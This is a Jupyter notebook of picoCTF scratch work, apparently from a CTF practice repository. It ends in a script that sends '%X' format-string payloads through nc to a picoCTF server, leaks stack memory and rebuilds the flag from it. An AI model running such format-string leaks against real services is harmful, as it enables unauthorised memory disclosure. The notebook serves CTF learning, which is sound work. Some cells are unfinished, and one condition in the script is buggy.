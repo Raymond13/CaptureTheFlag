{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [],
   "source": [
    "flag = \"551e6c4c5e55644b56566d1b5100153d4004026a4b52066b4a5556383d4b0007\"\n",
    "key = [2,4,6]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "32"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "potential_flag = 'picoCTF{abcdefghijklmnopqrstuvw}'\n",
    "len(potential_flag) # 32"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['37', '31', '37']"
      ]
     },
     "execution_count": 37,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "list(map(lambda p, k: \"{:02x}\".format(ord(p) ^ k), flag, key))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0\\n0'"
      ]
     },
     "execution_count": 51,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "'\\n'.join(['0']*32)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'10000000000000000000000000000000'"
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "'1' + '0' * 31"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('temp', 'r') as fh:\n",
    "    data = fh."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import subprocess\n",
    "import base64\n",
    "\n",
    "command = '(sleep 1; echo 1; sleep 1; echo {}) | nc mercury.picoctf.net 20195'\n",
    "\n",
    "for n in range(1, 51):\n",
    "    process = subprocess.Popen(command.format('%X' * n), stdout=subprocess.PIPE, shell=True)\n",
    "    output, error = process.communicate()\n",
    "    data = output.decode('utf-8')\n",
    "\n",
    "    potential_flag = data.split('\\n')[9]\n",
    "    #print(f'{n:2} {potential_flag} -> ', end='')\n",
    "    try:\n",
    "        flag = base64.b16decode(potential_flag)\n",
    "        #print(flag)\n",
    "        if b'ocip{' and b'}' in flag:\n",
    "            flag = flag[flag.find(b'ocip') : flag.find(b'}') + 1]\n",
    "            break\n",
    "    except ValueError as e:\n",
    "        #print(f'ValueError: {e}')\n",
    "        pass\n",
    "\n",
    "result = []\n",
    "for i in range(4, len(flag)+1, 4):\n",
    "    result.append(flag[i-4:i][::-1])\n",
    "result = b''.join(result)\n",
    "    \n",
    "if result.find(b'}') == len(result) -1:\n",
    "    print(result.decode())\n",
    "else:\n",
    "    print(result[:result.find(b'}')+1].decode())\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.3"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
